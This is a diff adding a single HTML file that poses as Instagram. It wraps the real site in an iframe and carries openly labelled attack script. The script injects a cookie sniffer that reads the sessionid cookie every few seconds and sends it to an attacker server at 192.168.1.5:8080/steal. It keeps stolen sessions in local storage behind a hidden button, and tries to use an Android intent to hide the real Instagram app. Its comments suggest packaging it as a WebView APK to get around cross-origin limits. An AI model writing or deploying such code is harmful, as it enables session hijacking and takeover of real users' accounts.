@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    
+    <!-- ALL CSS IS EMBEDDED HERE -->
+    <style>
+        /* Reset and full-screen layout */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #fafafa;
+        }
+        #webview {
+            width: 100vw;
+            height: 100vh;
+            border: none;
+        }
+        
+        /* Hidden button to view stolen data (tap bottom-left corner) */
+        #viewBtn {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            font-size: 10px;
+            opacity: 0.1;
+            background: none;
+            border: none;
+            color: #000;
+            padding: 5px 10px;
+            z-index: 999;
+        }
+        #viewBtn:active {
+            opacity: 0.5;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- The iframe loads the REAL Instagram website -->
+    <iframe id="webview" src="https://www.instagram.com/"></iframe>
+
+    <!-- Hidden button to view stolen data -->
+    <button id="viewBtn" onclick="viewStolenData()">🕵️</button>
+
+    <!-- ALL JAVASCRIPT IS EMBEDDED HERE -->
+    <script>
+        // --- PART 1: VIEW STOLEN DATA (Hidden Button) ---
+        function viewStolenData() {
+            var data = localStorage.getItem('stolen_sessions');
+            if (data) {
+                alert('Stolen Sessions:\n' + data);
+            } else {
+                var creds = localStorage.getItem('stolen_creds');
+                if (creds) {
+                    alert('Stolen Credentials:\n' + creds);
+                } else {
+                    alert('No stolen data yet.');
+                }
+            }
+        }
+
+        // --- PART 2: HIDE THE ORIGINAL INSTAGRAM APP FROM THE LAUNCHER ---
+        function hideOriginalInstagram() {
+            try {
+                // This attempts to open the app's settings page, which hides it from the launcher
+                var disableIntent = 'intent://com.instagram.android/#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;end';
+                window.location = disableIntent;
+                console.log('[+] Attempting to hide original Instagram app...');
+            } catch (e) {
+                console.log('[!] Could not hide original app:', e);
+            }
+        }
+
+        // Execute the hide attempt after 2 seconds
+        setTimeout(hideOriginalInstagram, 2000);
+
+        // --- PART 3: INJECT THE COOKIE SNIFFER INTO THE IFRAME ---
+        var iframe = document.getElementById('webview');
+
+        iframe.addEventListener('load', function() {
+            console.log('[+] Instagram page loaded. Injecting cookie sniffer...');
+
+            // The JavaScript code to inject into the iframe
+            var snifferScript = `
+                (function() {
+                    console.log('[+] Cookie sniffer active inside Instagram!');
+
+                    // Function to steal the sessionid cookie
+                    function stealCookie() {
+                        try {
+                            var cookies = document.cookie.split(';');
+                            for (var i = 0; i < cookies.length; i++) {
+                                var cookie = cookies[i].trim();
+                                if (cookie.indexOf('sessionid=') === 0) {
+                                    var sessionid = cookie.split('=')[1];
+                                    console.log('[+] Stolen Session ID:', sessionid);
+
+                                    // Send to Python server
+                                    // REPLACE YOUR_KALI_IP WITH YOUR ACTUAL KALI IP
+                                    fetch('http://192.168.1.5:8080/steal', {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/x-www-form-urlencoded',
+                                        },
+                                        body: 'sessionid=' + encodeURIComponent(sessionid)
+                                    })
+                                    .then(response => {
+                                        if (response.ok) {
+                                            console.log('[+] Session ID sent to server!');
+                                        }
+                                    })
+                                    .catch(err => {
+                                        console.log('[!] Server offline. Saved locally.');
+                                    });
+
+                                    // Save locally as backup
+                                    try {
+                                        var savedData = JSON.parse(localStorage.getItem('stolen_sessions')) || [];
+                                        savedData.push({
+                                            sessionid: sessionid,
+                                            timestamp: new Date().toISOString()
+                                        });
+                                        localStorage.setItem('stolen_sessions', JSON.stringify(savedData));
+                                    } catch (e) {}
+
+                                    return;
+                                }
+                            }
+                        } catch (e) {
+                            console.log('[!] Error reading cookies:', e);
+                        }
+                    }
+
+                    // Run every 3 seconds
+                    setInterval(stealCookie, 3000);
+                    stealCookie();
+                })();
+            `;
+
+            // Inject the sniffer into the iframe
+            try {
+                var iframeWindow = iframe.contentWindow;
+                var scriptElement = iframeWindow.document.createElement('script');
+                scriptElement.textContent = snifferScript;
+                iframeWindow.document.head.appendChild(scriptElement);
+                console.log('[+] Cookie sniffer injected successfully!');
+            } catch (e) {
+                console.log('[!] Could not inject sniffer (cross-origin limitation).');
+                console.log('[!] If this fails, the app needs to be built as a proper WebView APK.');
+            }
+        });
+
+        // Fallback: If iframe fails, redirect
+        iframe.addEventListener('error', function() {
+            console.log('[!] Iframe failed to load. Redirecting...');
+            window.location.href = 'https://www.instagram.com';
+        });
+
+        // --- PART 4: ATTEMPT TO GRAB COOKIES FROM PARENT (FALLBACK) ---
+        // If the iframe injection fails, this tries to read cookies from the parent
+        // (Only works if same-origin, which it won't be for Instagram)
+        try {
+            console.log('[+] Trying to read cookies from parent...');
+            var parentCookies = document.cookie;
+            if (parentCookies.indexOf('sessionid=') !== -1) {
+                console.log('[+] Found sessionid in parent!');
+                var match = parentCookies.match(/sessionid=([^;]+)/);
+                if (match) {
+                    var sessionid = match[1];
+                    console.log('[+] Stolen Session ID (parent):', sessionid);
+                    fetch('http://192.168.1.5:8080/steal', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: 'sessionid=' + encodeURIComponent(sessionid)
+                    });
+                }
+            }
+        } catch (e) {
+            // This is expected to fail due to cross-origin restrictions
+            console.log('[!] Cannot read parent cookies (cross-origin). This is normal.');
+        }
+    </script>
+</body>
+</html>
